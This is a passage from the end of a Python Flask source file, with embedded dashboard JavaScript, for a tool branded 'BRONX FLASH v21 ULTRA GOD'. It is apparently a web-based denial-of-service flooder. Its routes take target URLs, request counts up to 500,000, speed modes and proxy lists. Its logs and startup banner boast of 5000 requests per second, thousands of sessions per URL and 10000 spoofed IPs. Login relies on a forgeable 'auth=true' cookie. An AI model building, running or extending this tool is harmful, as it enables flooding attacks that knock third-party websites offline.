function saveProxies(){fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:document.getElementById('customProxies').value})})}
function saveMultiSession(){fetch('/multi_session',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:multiOn,sessions_per_url:parseInt(document.getElementById('sessionsPerUrl').value),rotating:rotateOn})})}
function refreshSessions(){fetch('/refresh_sessions',{method:'POST'}).then(r=>r.json()).then(d=>{alert(d.status);document.getElementById('sessionDisplay').textContent=d.pool_size;document.getElementById('poolSize').textContent=d.pool_size})}

function setEffect(e){
    fetch('/effect/'+e).then(function(){
        document.querySelectorAll('.effect-opt').forEach(function(el){el.classList.remove('active')});
        event.target.classList.add('active');
        applyEffect(e);
    });
}

function applyEffect(e){
    var el=document.getElementById('effects');
    el.innerHTML='';
    if(e==='snow')for(var i=0;i<35;i++){var d=document.createElement('div');d.style.cssText='position:absolute;color:#ff0055;font-size:'+(Math.random()*8+6)+'px;left:'+Math.random()*100+'%;animation:fall '+(Math.random()*4+2)+'s linear infinite;pointer-events:none';d.textContent='❄️';el.appendChild(d)}
    if(e==='matrix')for(var i=0;i<45;i++){var d=document.createElement('div');d.style.cssText='position:absolute;color:#00ff88;font-size:'+(Math.random()*10+5)+'px;left:'+Math.random()*100+'%;animation:fall '+(Math.random()*2+1.5)+'s linear infinite;pointer-events:none';d.textContent=String.fromCharCode(0x30A0+Math.random()*96);el.appendChild(d)}
    if(e==='particles')for(var i=0;i<25;i++){var d=document.createElement('div');d.style.cssText='position:absolute;width:'+(Math.random()*2+1)+'px;height:'+(Math.random()*2+1)+'px;background:#ffd700;left:'+Math.random()*100+'%;animation:float '+(Math.random()*3+2)+'s ease-in-out infinite;border-radius:50%;pointer-events:none';el.appendChild(d)}
    if(e==='cyber')for(var i=0;i<35;i++){var d=document.createElement('div');d.style.cssText='position:absolute;color:#00c8ff;font-size:'+(Math.random()*12+6)+'px;left:'+Math.random()*100+'%;animation:cyberFall '+(Math.random()*1.5+0.8)+'s linear infinite;pointer-events:none';d.textContent=Math.random()>0.5?'▓':'▒';el.appendChild(d)}
    if(e==='stars')for(var i=0;i<20;i++){var d=document.createElement('div');d.style.cssText='position:absolute;width:2px;height:2px;background:#fff;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:twinkle '+(Math.random()*1.5+0.8)+'s infinite;pointer-events:none';el.appendChild(d)}
    if(e==='quantum')for(var i=0;i<20;i++){var d=document.createElement('div');d.style.cssText='position:absolute;width:3px;height:3px;background:#ffd700;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:quantum '+(Math.random()*2+1.5)+'s infinite;border-radius:50%;box-shadow:0 0 15px #ffd700;pointer-events:none';el.appendChild(d)}
}

function resetStats(){fetch('/reset',{method:'POST'}).then(u)}
function resetLifetime(){if(confirm('Reset lifetime stats?')){fetch('/reset_lifetime',{method:'POST'}).then(u)}}
function copyIP(){var ip=document.getElementById('browserIP').textContent;navigator.clipboard.writeText(ip);alert('IP: '+ip)}
function testLatency(){var s=Date.now();document.getElementById('latencyResult').innerHTML='<span style="color:#ffd700">Testing...</span>';fetch('/ping').then(function(r){return r.json()}).then(function(){document.getElementById('latencyResult').innerHTML='<span style="color:#00ff88">'+(Date.now()-s)+'ms</span>'})}

function u(){
    fetch('/stats').then(function(r){return r.json()}).then(function(d){
        document.getElementById('success').textContent=d.success;
        document.getElementById('failed').textContent=d.failed;
        document.getElementById('total').textContent=d.total;
        document.getElementById('ltSuccess').textContent=d.lt_success;
        document.getElementById('ltTotal').textContent=d.lt_total;
        document.getElementById('activeSessions').textContent=d.active_attacks||0;
        var total=d.success+d.failed;
        document.getElementById('successRate').textContent=total>0?((d.success/total)*100).toFixed(1)+'%':'0%';
        var now=Date.now();
        var dt=now-lastTime;
        if(dt>0){document.getElementById('rps').textContent=Math.floor((d.total-lastTotal)/(dt/1000));lastTotal=d.total;lastTime=now;}
    });
}

function l(){fetch('/logs').then(function(r){return r.json()}).then(function(d){document.getElementById('logs').innerHTML=d.logs.map(function(x){return'<div class="log-e">'+x+'</div>'}).join('')})}

function start(){
    var urls=document.getElementById('urls').value.split('\\n').filter(function(u){return u.trim()});
    if(urls.length===0)return;
    fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
        urls:urls,count:parseInt(document.getElementById('count').value),
        speed:document.getElementById('speed').value,
        mode:document.getElementById('mode').value,
        proxy:proxyOn
    })}).then(function(r){return r.json()}).then(function(){
        document.getElementById('status').innerHTML='<span class="badge badge-multi">⚡ ULTRA ATTACK ACTIVE</span>';
        l();u();
    });
}

function stop(){fetch('/stop',{method:'POST'}).then(function(){document.getElementById('status').innerHTML='<span style="color:#666">Terminated</span>';l()})}

fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(d){document.getElementById('browserIP').textContent=d.ip});
fetch('/pool_status').then(function(r){return r.json()}).then(function(d){document.getElementById('sessionDisplay').textContent=d.pool_size;document.getElementById('poolSize').textContent=d.pool_size});
fetch('/current_effect').then(function(r){return r.json()}).then(function(d){if(d.effect)applyEffect(d.effect)});
setInterval(function(){l();u();document.getElementById('liveTime').textContent=new Date().toLocaleTimeString()},1000);
</script>
<style>
@keyframes fall{to{transform:translateY(110vh) rotate(360deg)}}
@keyframes float{0%,100%{transform:translateY(0)scale(1)}50%{transform:translateY(-25px)scale(1.3)}}
@keyframes twinkle{50%{opacity:0.15}}
@keyframes cyberFall{to{transform:translateY(110vh)}}
@keyframes quantum{0%,100%{transform:translate(0,0)scale(1);opacity:1}25%{transform:translate(15px,-15px)scale(1.4);opacity:0.4}50%{transform:translate(-15px,8px)scale(0.7);opacity:0.7}75%{transform:translate(8px,15px)scale(1.2);opacity:0.3}}
</style>
</body></html>"""

# ============================================
# FLASK ROUTES
# ============================================
current_effect = "cyber"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            resp = make_response('<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>')
            return resp
        return render_template_string(LOGIN, error="Access Denied", effect=current_effect)
    return render_template_string(LOGIN, error=None, effect=current_effect)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return render_template_string(DASH, effects=EFFECTS, current_effect=current_effect)

@app.route('/effect/<effect>')
def set_effect_route(effect):
    global current_effect
    if effect in EFFECTS:
        current_effect = effect
    return jsonify({"status": "ok", "effect": current_effect})

@app.route('/current_effect')
def get_current_effect():
    return jsonify({"effect": current_effect})

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    urls = [u.strip() for u in d.get('urls',[]) if u.strip()]
    count = min(int(d.get('count',1000)), 500000)
    speed = d.get('speed','ultragod')
    mode = d.get('mode','mixed')
    use_proxy = d.get('proxy',False)
    if not urls: return jsonify({"error":"URLs required"}),400
    
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    attack_logs.append(f"🎯 {len(urls)} targets | {count} req | {speed.upper()} | Multi-IP")
    attack_logs.append(f"🔗 {multi_session_config['sessions_per_url']} sessions/URL | 10000 spoofed IPs")
    
    t = threading.Thread(target=run_ultra_attack, args=(aid,urls,count,speed,mode))
    t.daemon=True; t.start()
    return jsonify({"status":"started","attack_id":aid,"speed":speed})

@app.route('/stop', methods=['POST'])
def stop():
    count = len(active_attacks)
    for k in list(active_attacks.keys()): del active_attacks[k]
    attack_logs.append(f"⏹️ {count} attacks terminated")
    return jsonify({"status":"stopped","count":count})

@app.route('/reset', methods=['POST'])
def reset():
    with stats_lock:
        attack_stats["success"] = 0
        attack_stats["failed"] = 0
        attack_stats["total"] = 0
    return jsonify({"status":"reset"})

@app.route('/reset_lifetime', methods=['POST'])
def reset_lifetime():
    with stats_lock:
        total_lifetime["success"] = 0
        total_lifetime["failed"] = 0
        total_lifetime["total"] = 0
    return jsonify({"status":"lifetime reset"})

@app.route('/rate', methods=['POST'])
def save_rate():
    global rate_limit_config
    d = request.get_json()
    rate_limit_config = {"enabled": d.get('enabled',False), "rpm": d.get('rpm',15)}
    return jsonify({"status":"saved"})

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip() and ':' in p]
    return jsonify({"status":"saved","count":len(custom_proxies)})

@app.route('/multi_session', methods=['POST'])
def save_multi_session():
    global multi_session_config
    d = request.get_json()
    multi_session_config = {
        "enabled": d.get('enabled',True),
        "sessions_per_url": min(d.get('sessions_per_url',100), 3000),
        "rotating": d.get('rotating',True)
    }
    attack_logs.append(f"🔗 Multi-Session: {multi_session_config['sessions_per_url']}/URL")
    return jsonify({"status":"saved"})

@app.route('/refresh_sessions', methods=['POST'])
def refresh_sessions():
    global session_pool
    with session_lock:
        new_count = min(500, len(session_pool))
        session_pool = session_pool[new_count:] + [create_ultra_session() for _ in range(new_count)]
    return jsonify({"status":"refreshed","pool_size":len(session_pool)})

@app.route('/pool_status')
def pool_status():
    return jsonify({"pool_size": len(session_pool), "active_attacks": len(active_attacks)})

@app.route('/ping')
def ping():
    return jsonify({"status":"pong","time":datetime.now().isoformat()})

@app.route('/logs')
def logs():
    return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats():
    with stats_lock:
        return jsonify({
            **attack_stats,
            "lt_success": total_lifetime["success"],
            "lt_total": total_lifetime["total"],
            "active_attacks": len(active_attacks),
            "pool_size": len(session_pool)
        })

@app.route('/logout')
def logout():
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

# ============================================
# STARTUP
# ============================================
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════╗
    ║   💀 BRONX FLASH v21 ULTRA GOD 💀       ║
    ║   ⚡ 5000 RPS • 3000 Sessions ⚡         ║
    ║   🛡️ MULTI-IP • 10000 Spoofed IPs 🛡️   ║
    ╚══════════════════════════════════════════╝
    """)
    initialize_session_pool()
    print(f"⚡ Session Pool: {len(session_pool)} sessions ready")
    print(f"🛡️ IP Pool: {len(IP_POOL)} spoofed IPs ready")
    print(f"🎯 Default Speed: ULTRA GOD (5000 RPS)")
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
